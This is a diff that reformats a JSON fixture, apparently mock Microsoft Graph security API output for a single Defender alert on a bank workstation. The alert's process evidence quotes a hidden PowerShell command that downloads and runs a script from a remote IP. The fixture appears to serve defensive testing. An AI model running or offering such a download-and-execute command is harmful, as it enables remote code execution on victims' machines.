@@ -1,13 +1,50 @@
-{"token": {"access_token": "eyJ0eXAi.sample", "expires_in": 3599, "token_type": "Bearer"},
- "pages": [{"status": 200, "body": {
-  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#security/alerts_v2",
-  "value": [
-   {"id": "da637551227677560813_-961444813", "title": "Suspicious PowerShell download", "severity": "high",
-    "category": "Execution", "createdDateTime": "2026-11-04T00:40:12.000Z", "serviceSource": "microsoftDefenderForEndpoint",
-    "description": "PowerShell downloaded and ran a script from the internet.", "mitreTechniques": ["T1059.001"],
-    "evidence": [
-      {"@odata.type": "#microsoft.graph.security.deviceEvidence", "deviceDnsName": "fin-ws-07.examplebank.in"},
-      {"@odata.type": "#microsoft.graph.security.userEvidence", "userAccount": {"userPrincipalName": "ravi.k@examplebank.in"}},
-      {"@odata.type": "#microsoft.graph.security.processEvidence",
-       "processCommandLine": "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.9/a')"},
-      {"@odata.type": "#microsoft.graph.security.ipEvidence", "ipAddress": "198.51.100.9"}]}]}}]}
+{
+ "token": {
+  "access_token": "eyJ0eXAi.sample",
+  "expires_in": 3599,
+  "token_type": "Bearer"
+ },
+ "pages": [
+  {
+   "status": 200,
+   "body": {
+    "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#security/alerts_v2",
+    "value": [
+     {
+      "id": "da637551227677560813_-961444813",
+      "title": "Suspicious PowerShell download",
+      "severity": "high",
+      "category": "Execution",
+      "createdDateTime": "2026-11-04T00:40:12.000Z",
+      "serviceSource": "microsoftDefenderForEndpoint",
+      "description": "PowerShell downloaded and ran a script from the internet.",
+      "mitreTechniques": [
+       "T1059.001"
+      ],
+      "evidence": [
+       {
+        "@odata.type": "#microsoft.graph.security.deviceEvidence",
+        "deviceDnsName": "fin-ws-07.examplebank.in"
+       },
+       {
+        "@odata.type": "#microsoft.graph.security.userEvidence",
+        "userAccount": {
+         "userPrincipalName": "ravi.k@examplebank.in"
+        }
+       },
+       {
+        "@odata.type": "#microsoft.graph.security.processEvidence",
+        "processCommandLine": "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.9/a')"
+       },
+       {
+        "@odata.type": "#microsoft.graph.security.ipEvidence",
+        "ipAddress": "198.51.100.9"
+       }
+      ],
+      "lastUpdateDateTime": "2026-11-04T00:40:12.000Z"
+     }
+    ]
+   }
+  }
+ ]
+}
